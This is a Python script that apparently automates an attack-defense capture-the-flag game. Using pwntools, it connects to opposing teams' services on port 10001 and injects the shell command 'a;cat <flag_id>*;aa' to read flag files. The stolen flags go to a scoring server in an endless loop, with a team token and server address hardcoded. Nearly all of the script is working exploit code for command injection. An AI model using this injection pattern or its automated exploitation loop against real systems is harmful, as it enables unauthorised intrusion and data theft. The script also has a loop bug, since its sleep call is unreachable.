#!/usr/bin/python3

from swpag_client import *
from pwn import *
import re

class ProjectCTFAPI():
    __slots__ = ('team')
    
    def __init__(self, gameIp, teamToken):
        self.team = Team(gameIp, teamToken)
        
    def getserviceid(self):
        serviceid = self.team.get_service_list()[0]['service_id']
        return serviceid
    
    def getTargets(self,service):
        targets = self.team.get_targets(service)
        for t in targets:
            for key in ['hostname','port','flag_id', 'team_name']:
                print("%10s : %s" % (key, t[key]))
            print("\n")
        return targets
    
    def submitFlag(self,flag):
        if not isinstance(flag,list):
            flag = [flag]
        status = self.team.submit_flag(flag)
        print(status)
        return status
    
    def getFLG(self, hostname, flagID):
        try:
            tflag=remote(hostname, 10001, timeout=2)
        except:
            return None
        
        # send exploit cmd
        tflag.sendline('2')
        tflag.sendline('a;cat '+flagID+'*;aa')
        tflag.sendline('123')
        tflag_result=tflag.recvall(timeout=1)
        a = str(tflag_result, encoding="utf-8")
        print (type(a))
        
        # search flag
        tflag_search = re.search('FLG[0-9A-Za-z]{13}', a)
        if tflag_search==None:
            tflag.close()
            return None
        
        FLG=tflag_search.group(0)
        print (FLG)
        tflag.close()
        return FLG
    
if __name__ == '__main__':
    teamToken = "ZOGR9UqlRWFg8wLJB3aj"                          # team information
    teaminterface = 'http://52.37.204.0/'                       # team information
    api = ProjectCTFAPI(teaminterface, teamToken)
    serviceIds = api.getserviceid()
    while True:
        targets = api.getTargets(serviceIds)
        for t in targets:
            if t['port']==10001:                                # backup service port
                FLG=api.getFLG(t['hostname'], t['flag_id'])
                if FLG != None:
                    try:
                        api.submitFlag(FLG)
                    except RuntimeError:
                        continue
    time.sleep(180)
